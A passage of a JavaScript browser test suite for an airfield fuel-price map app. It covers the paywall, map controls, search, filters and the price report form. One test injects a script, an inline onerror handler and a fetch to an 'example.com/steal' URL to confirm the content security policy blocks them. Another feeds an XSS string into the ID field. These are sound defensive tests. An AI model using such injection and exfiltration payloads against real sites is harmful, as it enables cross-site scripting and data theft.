// Every Airfield end-to-end tests. Injected into the real page by qa_server.py and run in headless
// Firefox by run.sh. Drives the UI with DOM events (click, input, submit, keydown, pointer, wheel)
// and reads a few internals through window.__qa (read-only getters added by the test server).
// Suites: ?suite=desktop | dark | phone | noapi. Multi-phase suites reload the page; the current
// phase is kept in sessionStorage.
(() => {
'use strict';
const SUITE = new URLSearchParams(location.search).get('suite') || 'desktop';
const PHASE = sessionStorage.getItem('qa.phase') || 'A';
const $ = id => document.getElementById(id);
const canvas = $('map');
const Q = () => window.__qa;
const sleep = ms => new Promise(r => setTimeout(r, ms));
const frames = async (n = 2) => { for (let k = 0; k < n; k++) await new Promise(r => requestAnimationFrame(r)); };

// Test shim: synthetic PointerEvents don't belong to an active pointer, so setPointerCapture would throw
// NotFoundError (it never does for real input). Swallow only that.
const realCap = Element.prototype.setPointerCapture;
Element.prototype.setPointerCapture = function (id) { try { return realCap.call(this, id); } catch (e) { if (e.name !== 'NotFoundError') throw e; } };

// ---------- tiny framework ----------
async function post(obj) {
  for (let k = 0; k < 5; k++) { try { await fetch('/__result', { method: 'POST', body: JSON.stringify(obj) }); return; } catch { await sleep(400); } }
}
async function waitFor(fn, what, ms = 20000) {
  const t0 = performance.now(); let v;
  while (!(v = await fn())) { if (performance.now() - t0 > ms) throw new Error('timed out waiting for ' + what); await sleep(40); }
  return v;
}
const assert = (c, msg) => { if (!c) throw new Error(msg); };
const eq = (a, b, msg) => { if (a !== b) throw new Error(`${msg}: expected ${JSON.stringify(b)}, got ${JSON.stringify(a)}`); };
const near = (a, b, tol, msg) => { if (!(Math.abs(a - b) <= tol)) throw new Error(`${msg}: expected ${b} ±${tol}, got ${a}`); };
const has = (s, sub, msg) => { if (!String(s).includes(sub)) throw new Error(`${msg}: expected to contain ${JSON.stringify(sub)}, got ${JSON.stringify(String(s).slice(0, 200))}`); };
async function test(name, fn) {
  const t0 = performance.now(), e0 = window.__qaErr.length;
  let ok = true, msg = '';
  try { await fn(); } catch (e) { ok = false; msg = String(e && e.message || e); }
  const errs = window.__qaErr.slice(e0);
  if (errs.length) { ok = false; msg += (msg ? ' | ' : '') + 'page errors: ' + errs.join('; '); }
  await post({ suite: SUITE, phase: PHASE, name, ok, msg, ms: Math.round(performance.now() - t0) });
  return ok;
}
function next(phase) { sessionStorage.setItem('qa.phase', phase); setTimeout(() => location.reload(), 50); }
async function done() { sessionStorage.removeItem('qa.phase'); await post({ suite: SUITE, done: true, errors: window.__qaErr }); }

// ---------- UI helpers ----------
const visible = el => !!el && !el.hidden && el.getClientRects().length > 0 && getComputedStyle(el).visibility !== 'hidden';
function type(el, v) { el.focus(); el.value = v; el.dispatchEvent(new Event('input', { bubbles: true })); }
function key(el, k, o = {}) { const e = new KeyboardEvent('keydown', { key: k, bubbles: true, cancelable: true, ...o }); el.dispatchEvent(e); return e; }
function setRange(el, v) { el.value = v; el.dispatchEvent(new Event('input', { bubbles: true })); el.dispatchEvent(new Event('change', { bubbles: true })); }
function check(el, on) { el.checked = on; el.dispatchEvent(new Event('change', { bubbles: true })); }
async function go(tab) {
  if (location.hash !== '#' + tab) location.hash = tab;
  await waitFor(() => !$('view-' + tab).hidden, 'tab ' + tab);
  await frames(2);
}
const gTitle = () => ($('gTitle') && $('gTitle').textContent) || '';
const lsJSON = k => { try { return JSON.parse(localStorage.getItem(k)); } catch { return undefined; } };
async function ready() {
  await waitFor(() => Q() && Q().N > 0 && $('loading').hidden, 'airports to load', 120000);
  await waitFor(() => Q().store.mode !== 'none' || $('liveState').textContent !== 'Connecting…', 'price store', 30000);
}
const idx = ident => Q().identIdx.get(ident);
const select_ = i => { Q().select(i); };
function screenOf(i) {
  const q = Q(), v = q.view; let dx = q.X[i] - v.cx; dx -= Math.round(dx);
  return { x: dx * v.scale + q.W / 2, y: (q.Y[i] - v.cy) * v.scale + q.H / 2 };
}
const mxw = lon => (lon + 180) / 360;
const myw = lat => { const l = lat * Math.PI / 180; return (1 - Math.log(Math.tan(l) + 1 / Math.cos(l)) / Math.PI) / 2; };
async function goto(lat, lon, miles) {
  const q = Q(), v = q.view;
  v.cx = ((mxw(lon) % 1) + 1) % 1; v.cy = myw(lat);
  v.scale = Math.max(q.W, q.H) * 24901 * Math.cos(lat * Math.PI / 180) / miles;
  q.invalidate(); await frames(3); await sleep(300); await frames(2);
}
async function settle() { await waitFor(() => !Q().anim, 'map animation', 15000); await frames(3); await sleep(250); await frames(2); }
function cpt(x, y) { const r = canvas.getBoundingClientRect(); return { clientX: r.left + x, clientY: r.top + y }; }
function ptr(type, x, y, id = 1, pt = 'mouse') {
  canvas.dispatchEvent(new PointerEvent(type, { ...cpt(x, y), pointerId: id, pointerType: pt, isPrimary: id === 1, bubbles: true, cancelable: true, button: 0, buttons: type === 'pointerup' ? 0 : 1 }));
}
async function tap(x, y, pt = 'mouse') { ptr('pointerdown', x, y, 1, pt); ptr('pointerup', x, y, 1, pt); await frames(2); }
async function drag(x0, y0, x1, y1, steps = 10) {
  ptr('pointerdown', x0, y0);
  for (let k = 1; k <= steps; k++) { ptr('pointermove', x0 + (x1 - x0) * k / steps, y0 + (y1 - y0) * k / steps); await frames(1); }
  await sleep(120);   // let go after stopping, so there is no fling
  ptr('pointerup', x1, y1); await frames(2);
}
function patch(x, y, r = 5) {
  const g = canvas.getContext('2d'), d = Q().DPR;
  return g.getImageData(Math.round((x - r) * d), Math.round((y - r) * d), Math.round(2 * r * d), Math.round(2 * r * d)).data;
}
const pdiff = (a, b) => { let s = 0; for (let k = 0; k < a.length; k++) s += Math.abs(a[k] - b[k]); return s; };
function lum(css) {
  const m = css.match(/\d+(\.\d+)?/g); if (!m) return NaN;
  const [r, g, b] = m.map(Number); return (0.2126 * r + 0.7152 * g + 0.0722 * b) / 255;
}
function pixLum(x, y) { const p = patch(x, y, 1); return (0.2126 * p[0] + 0.7152 * p[1] + 0.0722 * p[2]) / 255; }
const noHScroll = () => document.documentElement.scrollWidth <= innerWidth + 1;
async function serverPrices() { const r = await fetch('/api/prices', { cache: 'no-store' }); return (await r.json()).prices; }
async function ctl(q) { await fetch('/__ctl?' + q); }

// gate helpers
async function signInProvider(p = 'google') {
  await go('fuel'); await waitFor(() => visible($('gate')), 'gate');
  document.querySelector(`#gate [data-act=provider][data-p=${p}]`).click();
  await waitFor(() => gTitle() === 'Unlock Find Fuel', 'pay step', 5000);
}
async function payAndOpen() {
  document.querySelector('#gate [data-act=pay]').click();
  await waitFor(() => gTitle() === 'You’re cleared for fuel' || gTitle() === "You're cleared for fuel", 'done step', 5000);
  document.querySelector('#gate [data-act=open]').click();
  await waitFor(() => $('gate').hidden, 'gate to close');
  await frames(2);
}
// report helpers
async function openReport(ident) {
  await go('report');
  type($('apt'), ident);
  const li = await waitFor(() => $('aptList').querySelector('li[data-i]'), 'airport suggestions');
  li.click();
  await waitFor(() => !$('modal').hidden, 'price pop-up');
  await sleep(30);
}
async function submitPrice(fuel, value) {
  $('mFuel').querySelector(`[data-f="${fuel}"]`).click();
  type($('price'), value);
  $('mSave').click();
  await sleep(30);
  await waitFor(() => $('modal').hidden || !$('mSave').disabled, 'save to finish', 15000);
  await sleep(30);
}
async function setLocText(text) {
  if (!$('locChip').hidden) $('locClear').click();
  type($('locq'), text);
  key($('locq'), 'Enter');
  await waitFor(() => !$('locChip').hidden, 'finder location set');
  await settle();
}

// ======================================================================
const suites = {};

suites.desktop = {
  async A() {
    await test(`viewport ${innerWidth}x${innerHeight} @${devicePixelRatio}x`, async () => { assert(innerWidth >= 1000, 'desktop-sized viewport'); });
    await test('security: injected scripts, inline handlers and outside connections are refused', async () => {
      const violations = [];
      const onV = e => violations.push(e.violatedDirective);
      document.addEventListener('securitypolicyviolation', onV);
      const sc = document.createElement('script'); sc.textContent = 'window.__pwned = 1'; document.body.appendChild(sc);
      const box = document.createElement('div'); box.innerHTML = '<img src="data:," onerror="window.__pwned2 = 1">'; document.body.appendChild(box);
      let leaked = true;
      try { await fetch('https://example.com/steal?x=1', { mode: 'no-cors' }); } catch { leaked = false; }
      await sleep(300);
      document.removeEventListener('securitypolicyviolation', onV); sc.remove(); box.remove();
      eq(window.__pwned, undefined, 'injected <script> did not run');
      eq(window.__pwned2, undefined, 'inline onerror handler did not run');
      eq(leaked, false, 'request to another site blocked');
      assert(violations.some(v => v.startsWith('script-src')) && violations.some(v => v.startsWith('connect-src')), 'violations reported: ' + violations.join(','));
    });
    await test('tabs: Find Fuel, Report, Download, then the Settings gear', async () => {
      eq([...document.querySelectorAll('.tabs a')].map(a => a.dataset.tab).join(','), 'fuel,report,download,settings', 'order');
    });
    await test('download tab: three systems, this computer recommended', async () => {
      await go('download');
      eq(document.querySelector('.tabs a[data-tab=download]').getAttribute('aria-current'), 'page', 'aria-current');
      const cards = [...document.querySelectorAll('#dlBody .oscard')];
      eq(cards.map(c => c.getAttribute('href')).join(','), '#download-windows,#download-mac,#download-linux', 'branches');
      has(document.querySelector('#dlBody .oscard.recommended').textContent, 'Linux', 'headless Firefox here runs on Linux');
    });
    for (const [os, name] of [['windows', 'Windows'], ['mac', 'macOS'], ['linux', 'Linux']]) {
      await test(`download ${name}: its own page with install steps and a download button`, async () => {
        location.hash = 'download-' + os; await waitFor(() => $('dlBody').textContent.includes('Every Airfield for ' + name), name + ' page');
        assert(!$('view-download').hidden, 'download view'); has($('dlBody').textContent, 'Install in', 'steps');
        const btn = document.querySelector('#dlBody .dlbtn');
        assert(btn, 'button');
        if (btn.tagName === 'A') {   // apps built: the link must point at a real file
          const r = await fetch(btn.getAttribute('href'), { method: 'HEAD' }); eq(r.status, 200, 'download file ' + btn.getAttribute('href'));
        } else eq(btn.getAttribute('aria-disabled'), 'true', 'coming soon');
        document.querySelector('#dlBody .crumb').click(); await waitFor(() => document.querySelector('#dlBody .oscards'), 'back to all');
      });
    }
    await test('old #home link opens Download; unknown #hash opens the map', async () => {
      location.hash = 'home'; await waitFor(() => !$('view-download').hidden, 'download');
      location.hash = 'nope'; await waitFor(() => !$('view-fuel').hidden, 'fuel');
      assert($('view-download').hidden && $('view-report').hidden, 'others hidden');
    });
    await test('settings: theme switch sets and remembers light, dark, automatic', async () => {
      await go('settings');
      document.querySelector('[data-theme-choice=dark]').click(); eq(document.documentElement.dataset.theme, 'dark', 'dark');
      eq(lsJSON('ea.settings').theme, 'dark', 'saved');
      document.querySelector('[data-theme-choice=light]').click(); eq(document.documentElement.dataset.theme, 'light', 'light');
      document.querySelector('[data-theme-choice=auto]').click(); eq(document.documentElement.dataset.theme, undefined, 'automatic');
      eq(document.querySelector('[data-theme-choice=auto]').getAttribute('aria-checked'), 'true', 'radio state');
    });
    await test('settings: live planes and both airspace layers start switched on', async () => {
      eq(Q().settings.planes, true, 'planes'); eq(Q().settings.airspace, true, 'class airspace'); eq(Q().settings.sua, true, 'special-use');
      eq($('planesOn').checked, true, 'switch'); eq($('planesOnMap').checked, true, 'map layers switch');
    });
    await test('fuel tab signed out: paywall card, map and rail locked', async () => {
      await go('fuel');
      assert(visible($('gate')), 'gate visible');
      assert($('view-fuel').classList.contains('locked'), 'locked class');
      eq(canvas.tabIndex, -1, 'canvas not tabbable');
      eq(getComputedStyle(document.querySelector('.rail')).visibility, 'hidden', 'rail hidden');
      assert($('acct').hidden, 'account bar hidden');
      eq(gTitle(), 'Create your account', 'gate title');
      eq(document.querySelectorAll('#gate [data-act=provider]').length, 4, 'provider buttons');
      has($('gate').textContent, 'TEST MODE', 'test badge');
    });
    await test('gate keyboard: focus starts inside the sign-up card', async () => {
      assert($('gate').contains(document.activeElement), 'focus in gate, got ' + document.activeElement?.outerHTML?.slice(0, 80));
      const f = [...$('gate').querySelectorAll('button, input')].filter(el => !el.disabled && el.tabIndex >= 0 && visible(el));
      assert(f.length >= 7, 'all gate controls focusable (' + f.length + ')');
    });
    await test('gate: empty name rejected with message', async () => {
      type($('gName'), ''); type($('gEmail'), '');
      $('emailForm').requestSubmit();
      eq($('gErr').textContent, 'Enter your name.', 'error');
      eq(document.activeElement, $('gName'), 'focus on name');
      eq(localStorage.getItem('ea.account'), null, 'no account');
    });
    await test('gate: invalid emails rejected', async () => {
      for (const bad of ['ann', 'ann@bad', 'ann@ex ample.com', '@x.com', 'a@b.']) {
        type($('gName'), 'Ann'); type($('gEmail'), bad);
        $('emailForm').requestSubmit();
        has($('gErr').textContent, 'Enter an email address', 'error for ' + bad);
        eq(document.activeElement, $('gEmail'), 'focus on email');
      }
      eq(localStorage.getItem('ea.account'), null, 'no account');
    });
    await test('gate: Continue with Google -> setup fee step ($5 fee, $0.00 due)', async () => {
      document.querySelector('#gate [data-p=google]').click();
      has(document.querySelector('#gate [data-p=google]').textContent, 'Connecting…', 'busy label');
      assert(document.querySelector('#gate [data-p=github]').disabled, 'other buttons disabled while busy');
      await waitFor(() => gTitle() === 'Unlock Find Fuel', 'pay step', 5000);
      has($('gate').querySelector('.who').textContent, 'Google test pilot', 'who');
      has($('gate').querySelector('.who').textContent, 'test account', 'test account');
      const bill = $('gate').querySelector('.bill').textContent;
      has(bill, '$5.00', 'fee'); has(bill, 'Due today', 'due'); has(bill, '$0.00', 'zero due');
      has($('gate').querySelector('[data-act=pay]').textContent, 'Unlock for $0.00', 'pay label');
      assert(!$('acct').hidden, 'account bar shown');
      eq($('acctPlan').textContent, 'Setup fee pending · test', 'plan');
      const a = lsJSON('ea.account'); eq(a.provider, 'google', 'stored provider'); eq(a.paid, false, 'stored unpaid');
    });
    await test('gate keyboard: on the fee step focus lands on the Unlock button (not "Switch")', async () => {
      eq(document.activeElement && document.activeElement.dataset.act, 'pay', 'focused action');
    });
    await test('gate: Switch signs out back to account step', async () => {
      $('gate').querySelector('[data-act=switch]').click();
      eq(gTitle(), 'Create your account', 'title');
      assert($('acct').hidden, 'account bar hidden');
      eq(localStorage.getItem('ea.account'), null, 'account removed');
    });
    await test('gate: email sign-up via Enter (form submit), email normalised', async () => {
      type($('gName'), '  Test Pilot '); type($('gEmail'), '  Pilot@Example.COM ');
      $('emailForm').requestSubmit();
      eq(gTitle(), 'Unlock Find Fuel', 'pay step');
      has($('gate').querySelector('.who').textContent, 'pilot@example.com', 'email shown lower-case');
      eq(lsJSON('ea.account').name, 'Test Pilot', 'trimmed name');
      eq($('acctAv').textContent, 'T', 'avatar initial');
    });
    await test('gate: leaving and returning while unpaid keeps the paywall', async () => {
      await go('report'); await go('fuel');
      assert(visible($('gate')), 'gate'); eq(gTitle(), 'Unlock Find Fuel', 'still on pay step');
    });
    await test('gate: unlock -> "cleared for fuel" -> Open the map', async () => {
      $('gate').querySelector('[data-act=pay]').click();
      has($('gate').querySelector('[data-act=pay]').textContent, 'Unlocking', 'busy');
      await waitFor(() => $('gate').querySelector('[data-act=open]'), 'done step', 5000);
      has($('gate').textContent, 'charged $0.00', 'charged nothing');
      eq(document.activeElement, $('gate').querySelector('[data-act=open]'), 'focus on Open the map');
      $('gate').querySelector('[data-act=open]').click();
      await waitFor(() => $('gate').hidden, 'gate hidden');
      assert(!$('view-fuel').classList.contains('locked'), 'unlocked');
      eq(canvas.tabIndex, 0, 'canvas tabbable');
      eq($('acctPlan').textContent, 'Find Fuel unlocked · test', 'plan');
      eq(lsJSON('ea.account').paid, true, 'stored paid');
    });
    await test('gate keyboard: after "Open the map" focus moves to the map (arrow keys work)', async () => {
      eq(document.activeElement, canvas, 'focused element');
    });
    await test('airport data + price API load', async () => {
      await ready();
      eq($('total').textContent, (72657).toLocaleString(), 'airport count');
      eq($('liveState').textContent, 'Updates every 30 s', 'live state');
      eq(Q().store.mode, 'api', 'store mode');
    });
    await test('world view: airports hidden, "zoom in" notice shown', async () => {
      $('zhome').click(); await settle();
      assert(!Q().airportsShown, 'airports hidden');
      assert(visible($('notice')), 'notice'); has($('notice').textContent.replace(/\u00a0/g, ' '), '500 mi', 'notice text');
      has($('span').textContent, 'wide', 'view width readout');
    });
    await test('zoom buttons double / halve the scale', async () => {
      await goto(39, -98, 3000);
      const s0 = Q().view.scale;
      $('zin').click(); await settle(); near(Q().view.scale / s0, 2, 0.02, 'zoom in');
      $('zout').click(); await settle(); near(Q().view.scale / s0, 1, 0.02, 'zoom out');
    });
    await test('keyboard on map: arrows pan, +/- zoom, 0 = whole world', async () => {
      canvas.focus(); await goto(39, -98, 3000);
      const v = Q().view, cx0 = v.cx, cy0 = v.cy, s0 = v.scale;
      assert(key(canvas, 'ArrowRight').defaultPrevented, 'arrow handled');
      near(v.cx - cx0, 120 / s0, 1e-9, 'ArrowRight pans east');
      key(canvas, 'ArrowLeft'); near(v.cx, cx0, 1e-9, 'ArrowLeft back');
      key(canvas, 'ArrowUp'); assert(v.cy < cy0, 'ArrowUp pans north');
      key(canvas, 'ArrowDown'); near(v.cy, cy0, 1e-9, 'ArrowDown back');
      key(canvas, '+'); await settle(); near(v.scale / s0, 2, 0.02, '+ zooms in');
      key(canvas, '-'); await settle(); near(v.scale / s0, 1, 0.02, '- zooms out');
      key(canvas, '='); await settle(); near(v.scale / s0, 2, 0.02, '= zooms in');
      key(canvas, '0'); await settle(); await sleep(300);
      near(v.cx, mxw(-40), 1e-3, '0 goes home');
      assert(!key(canvas, 'a').defaultPrevented, 'other keys not swallowed');
    });
    await test('mouse wheel zooms around the cursor', async () => {
      await goto(40, -100, 3000);
      const q = Q(), v = q.view, px = Math.round(q.W * 0.3), py = Math.round(q.H * 0.4);   // MouseEvent clientX/Y are whole pixels in Firefox
      const w0 = [v.cx + (px - q.W / 2) / v.scale, v.cy + (py - q.H / 2) / v.scale], s0 = v.scale;
      canvas.dispatchEvent(new WheelEvent('wheel', { ...cpt(px, py), deltaY: -100, deltaMode: 0, bubbles: true, cancelable: true }));
      near(v.scale / s0, Math.exp(0.22), 1e-3, 'scale');
      near(v.cx + (px - q.W / 2) / v.scale, w0[0], 1e-9, 'x under cursor fixed');
      near(v.cy + (py - q.H / 2) / v.scale, w0[1], 1e-9, 'y under cursor fixed');
      canvas.dispatchEvent(new WheelEvent('wheel', { ...cpt(px, py), deltaY: 100, deltaMode: 0, bubbles: true, cancelable: true }));
      near(v.scale / s0, 1, 1e-3, 'zoom back out');
    });
    await test('drag pans the map; a drag is not a click', async () => {
      await goto(40, -100, 300);
      const v = Q().view, cx0 = v.cx, cy0 = v.cy, s = v.scale;
      await drag(600, 400, 800, 300);
      near(v.cx, cx0 - 200 / s, 1e-9, 'cx'); near(v.cy, cy0 + 100 / s, 1e-9, 'cy');
      eq(Q().selected, -1, 'nothing selected by drag');
      assert(!canvas.classList.contains('dragging'), 'drag state cleared');
    });
    await test('pinch with two touch pointers zooms', async () => {
      await goto(40, -100, 3000);
      const q = Q(), v = q.view, s0 = v.scale, cx = q.W / 2, cy = q.H / 2;
      ptr('pointerdown', cx - 100, cy, 1, 'touch'); ptr('pointerdown', cx + 100, cy, 2, 'touch');
      for (let k = 1; k <= 5; k++) { ptr('pointermove', cx - 100 - 10 * k, cy, 1, 'touch'); ptr('pointermove', cx + 100 + 10 * k, cy, 2, 'touch'); await frames(1); }
      ptr('pointerup', cx - 150, cy, 1, 'touch'); ptr('pointerup', cx + 150, cy, 2, 'touch');
      assert(v.scale / s0 > 1.3 && v.scale / s0 < 1.6, 'pinch zoom ratio ' + (v.scale / s0));
      eq(Q().selected, -1, 'pinch is not a click');
    });
    await test('double-click zooms in', async () => {
      await goto(40, -100, 3000);
      const s0 = Q().view.scale;
      canvas.dispatchEvent(new MouseEvent('dblclick', { ...cpt(500, 400), bubbles: true }));
      await settle(); near(Q().view.scale / s0, 2, 0.02, 'ratio');
    });
    const SMO = idx('KSMO');
    await test('airports appear once the view is under 500 mi wide', async () => {
      await goto(34.0158, -118.451, 600); assert(!Q().airportsShown, 'hidden at 600 mi');
      await goto(34.0158, -118.451, 300);
      assert(Q().airportsShown, 'shown at 300 mi'); assert(!visible($('notice')), 'notice hidden');
    });
    await test('click an airport: detail card with codes, place, no price', async () => {
      await goto(34.0158, -118.451, 60);
      const p = screenOf(SMO); await tap(p.x, p.y);
      eq(Q().selected, SMO, 'selected');
      assert(visible($('card')), 'card visible');
      eq($('card').querySelector('h2').textContent, 'Santa Monica Municipal Airport', 'name');
      has($('card').querySelector('.codes').textContent, 'SMO', 'IATA'); has($('card').querySelector('.codes').textContent, 'KSMO', 'ICAO');
      has($('card').querySelector('.place').textContent, 'Santa Monica, United States', 'place');
      has($('card').textContent, 'No fuel price reported here yet.', 'no price');
      has($('card').querySelector('a.linkbtn').href, '/airports/KSMO/', 'airport link');
    });
    await test('hover shows tooltip; leaving the map hides it', async () => {
      const p = screenOf(SMO);
      ptr('pointermove', p.x + 1, p.y + 1); ptr('pointermove', p.x, p.y); await frames(1);
      assert(visible($('tip')), 'tip visible'); has($('tip').textContent, 'Santa Monica Municipal', 'tip text');
      assert($('pos').textContent.includes('N'), 'position readout');
      canvas.dispatchEvent(new PointerEvent('pointerleave', { bubbles: false }));
      assert($('tip').hidden, 'tip hidden');
    });
    await test('Escape closes the card; close button too', async () => {
      key(document.body, 'Escape'); assert($('card').hidden, 'Escape'); eq(Q().selected, -1, 'deselected');
      const p = screenOf(SMO); await tap(p.x, p.y); assert(visible($('card')), 'reopened');
      $('cardclose').click(); assert($('card').hidden, 'close button'); eq(document.activeElement, canvas, 'focus back to map');
    });
    await test('click on open water selects nothing', async () => {
      await goto(20, -140, 200); await tap(400, 400); eq(Q().selected, -1, 'selected'); assert($('card').hidden, 'no card');
    });
    await test('search by code (lower-case) + Enter flies to the airport', async () => {
      type($('q'), 'ksmo'); assert(visible($('results')), 'results');
      eq($('results').querySelector('li .code').textContent, 'SMO', 'first result');
      key($('q'), 'Enter');
      assert(visible($('card')), 'card'); eq(Q().selected, SMO, 'selected');
      await settle();
      const p = screenOf(SMO); near(p.x, Q().W / 2, 3, 'centred x'); near(p.y, Q().H / 2, 3, 'centred y');
      assert(Q().airportsShown, 'zoomed in far enough to show airports');
    });
    await test('search: arrow keys move the highlighted result', async () => {
      type($('q'), 'santa monica');
      assert($('results').querySelectorAll('li[data-i]').length >= 1, 'results');
      if ($('results').querySelectorAll('li[data-i]').length > 1) {
        key($('q'), 'ArrowDown'); eq($('q').getAttribute('aria-activedescendant'), 'r1', 'active r1');
        eq($('r1').getAttribute('aria-selected'), 'true', 'r1 selected');
        key($('q'), 'ArrowUp'); eq($('q').getAttribute('aria-activedescendant'), 'r0', 'back to r0');
      }
      has($('results').textContent, 'Santa Monica Municipal Airport', 'city search finds SMO');
    });
    await test('search with no results shows a message; Enter does nothing; Escape clears', async () => {
      key(document.body, 'Escape');
      type($('q'), 'zzqxjvqq');
      has($('results').textContent, 'No airports match', 'empty message');
      key($('q'), 'Enter'); eq(Q().selected, -1, 'nothing selected');
      key($('q'), 'Escape'); eq($('q').value, '', 'cleared'); assert($('results').hidden, 'list hidden');
      type($('q'), '   '); assert($('results').hidden || $('results').textContent.includes('Recent'), 'whitespace-only shows recents (or nothing), never a "no match"');
      key($('q'), 'Escape'); type($('q'), '');
      type($('q'), '');
    });
    await test('layer chips: turning off a type hides it from search, map clicks and the card', async () => {
      document.querySelector('details.layers').open = true;
      const chips = [...$('filters').querySelectorAll('.chip')];
      eq(chips.length, 6, 'chip count');
      const total = chips.reduce((s, c) => s + Number(c.querySelector('.n').textContent.replace(/\D/g, '')), 0);
      eq(total, 72657, 'chip counts add up');
      type($('q'), 'KSMO'); key($('q'), 'Enter'); await settle();
      const med = chips[1]; med.click();
      eq(med.getAttribute('aria-pressed'), 'false', 'pressed=false');
      assert($('card').hidden, 'card for hidden type closed');
      type($('q'), 'KSMO'); has($('results').textContent, 'No airports match', 'not searchable');
      const p = screenOf(SMO); await tap(p.x, p.y); assert(Q().selected !== SMO, 'not clickable');
      key(document.body, 'Escape');
      med.click(); eq(med.getAttribute('aria-pressed'), 'true', 'back on');
      type($('q'), 'KSMO'); eq($('results').querySelector('li .code')?.textContent, 'SMO', 'searchable again');
      key($('q'), 'Escape');
    });
    await test('"Scheduled passenger service only" filter', async () => {
      check($('sched'), true);
      type($('q'), 'KSMO'); has($('results').textContent, 'No airports match', 'SMO has no airline service');
      type($('q'), 'KLAX'); eq($('results').querySelector('li .code')?.textContent, 'LAX', 'LAX stays');
      check($('sched'), false); key($('q'), 'Escape');
    });
    await test('"Only airports with a reported fuel price" with no prices yet', async () => {
      check($('fuelOnly'), true);
      type($('q'), 'KLAX'); has($('results').textContent, 'No airports match', 'no priced airports');
      check($('fuelOnly'), false); key($('q'), 'Escape');
    });
    await test('finder with no location: prompt, empty list; locate button focuses the input', async () => {
      if (!$('locChip').hidden) $('locClear').click();
      has($('summary').textContent, 'Set a location above', 'summary');
      eq($('finderList').children.length, 0, 'empty list');
      $('zloc').click(); eq(document.activeElement, $('locq'), 'focus');
    });
    await test('finder location: garbage text -> "no match", Enter sets nothing', async () => {
      type($('locq'), 'qqzzxxvv');
      has($('locList').textContent, 'No airport or city matches', 'message');
      key($('locq'), 'Enter'); assert($('locChip').hidden, 'no location');
    });
    await test('finder location: out-of-range "95, 200" is not taken as coordinates', async () => {
      type($('locq'), '95, 200');
      assert(!$('locList').querySelector('[data-ll]'), 'no GPS row');
      key($('locq'), 'Enter'); assert($('locChip').hidden, 'no location');
    });
    await test('finder location: "34.0, -118.4" coordinates', async () => {
      type($('locq'), '34.0, -118.4');
      assert($('locList').querySelector('[data-ll]'), 'GPS row offered');
      key($('locq'), 'Enter');
      assert(!$('locChip').hidden, 'chip'); has($('locLabel').textContent, '34°00′00″N 118°24′00″W', 'label');
      has($('summary').textContent, 'No fuel prices reported within 100 mi', 'no prices yet');
      has($('finderList').textContent, 'Drag the radius slider', 'hint');
      eq(lsJSON('ea.finder').loc.lat, 34, 'saved');
      await settle();
    });
    await test('finder: clear location', async () => {
      $('locClear').click();
      assert($('locChip').hidden && !$('locEntry').hidden, 'entry back'); eq(document.activeElement, $('locq'), 'focus');
      has($('summary').textContent, 'Set a location above', 'summary');
      eq(lsJSON('ea.finder').loc, null, 'saved cleared');
    });
    await test('finder location: airport picked from suggestions', async () => {
      type($('locq'), 'KSMO');
      $('locList').querySelector('li[data-i]').click();
      eq($('locLabel').textContent, 'SMO · Santa Monica Municipal Airport', 'label');
      await settle();
    });
    await test('finder: radius slider 10-500 updates label, summary, saved prefs', async () => {
      setRange($('radius'), 500); eq($('radOut').textContent, '500 mi', 'label 500');
      has($('summary').textContent, '500 mi', 'summary'); eq(lsJSON('ea.finder').radius, 500, 'saved');
      setRange($('radius'), 9999); eq($('radOut').textContent, '500 mi', 'clamped to max');
      setRange($('radius'), 1); eq($('radOut').textContent, '10 mi', 'clamped to min');
      setRange($('radius'), 100); eq($('radOut').textContent, '100 mi', 'back to 100');
      await settle();
    });
    await test('finder: fuel type buttons', async () => {
      const b = $('fuelSeg').querySelector('[data-f="100LL"]'); b.click();
      eq(b.getAttribute('aria-pressed'), 'true', 'pressed'); has($('summary').textContent, 'No 100LL prices', 'summary');
      eq(lsJSON('ea.finder').fuel, '100LL', 'saved');
      $('fuelSeg').querySelector('[data-f=any]').click(); has($('summary').textContent, 'No fuel prices', 'any');
    });
    await test('finder: Pick on map (Escape cancels; click sets the point)', async () => {
      $('pickMap').click(); eq($('pickMap').getAttribute('aria-pressed'), 'true', 'pressed'); await frames(2);
      has($('notice').textContent, 'Click the map', 'notice');
      key(document.body, 'Escape'); eq(Q().pickMode, false, 'Escape cancels');
      await goto(36, -115, 300);
      $('pickMap').click(); await tap(Q().W / 2, Q().H / 2);
      eq(Q().pickMode, false, 'pick mode ends'); eq(Q().selected, -1, 'no airport selected by the pick');
      near(Q().finder.loc.lat, 36, 0.01, 'lat'); near(Q().finder.loc.lon, -115, 0.01, 'lon');
      has($('locLabel').textContent, '36°', 'label');
    });
    await test('finder: Use my location (geolocation allowed)', async () => {
      $('useGeo').click();
      await waitFor(() => $('locLabel').textContent === 'Your location' || /wasn’t shared|can’t share/.test($('summary').textContent), 'geolocation result', 20000);
      eq($('locLabel').textContent, 'Your location', 'label');
      near(Q().finder.loc.lat, 34.05, 0.01, 'lat'); assert(!$('useGeo').disabled, 'button re-enabled');
      await settle();
    });

    // ---------- report ----------
    await test('report: empty Airport ID + Enter does nothing (no pop-up, no error)', async () => {
      await go('report'); type($('apt'), '');
      $('aptForm').requestSubmit(); await sleep(50);
      assert($('modal').hidden, 'no modal'); assert($('aptList').hidden, 'no list');
    });
    await test('report: garbage ID shows "no airport has that ID"', async () => {
      for (const g of ['ZZ9Q!X', '<img src=x onerror=alert(1)>', '%%%']) {
        type($('apt'), g);
        has($('aptList').textContent, 'No airport has the ID', 'message for ' + g);
        $('aptForm').requestSubmit(); await sleep(30); assert($('modal').hidden, 'no modal for ' + g);
      }
      type($('apt'), '    '); assert($('aptList').hidden, 'whitespace hides list');
    });
    await test('report: type ID, arrow through suggestions, pick -> price pop-up', async () => {
      type($('apt'), 'santa monica');
      const n = $('aptList').querySelectorAll('li[data-i]').length;
      if (n > 1) { key($('apt'), 'ArrowDown'); eq($('aptList').children[1].getAttribute('aria-selected'), 'true', 'arrow moves'); key($('apt'), 'ArrowUp'); }
      type($('apt'), 'ksmo');
      eq($('aptList').querySelector('li .code').textContent, 'SMO', 'suggestion');
      $('aptList').querySelector('li[data-i]').click();
      await waitFor(() => !$('modal').hidden, 'modal');
      eq($('mFor').textContent, 'Santa Monica Municipal Airport · SMO', 'for');
      eq($('apt').value, 'KSMO', 'ID filled'); assert(visible($('picked')), 'picked card');
      await sleep(30); eq(document.activeElement, $('price'), 'price focused'); eq($('ferr').textContent, '', 'no error');
    });
    await test('report keyboard: Tab / Shift+Tab stay inside the pop-up', async () => {
      $('mSave').focus(); key($('mSave'), 'Tab'); eq(document.activeElement, $('mClose'), 'Tab wraps to first');
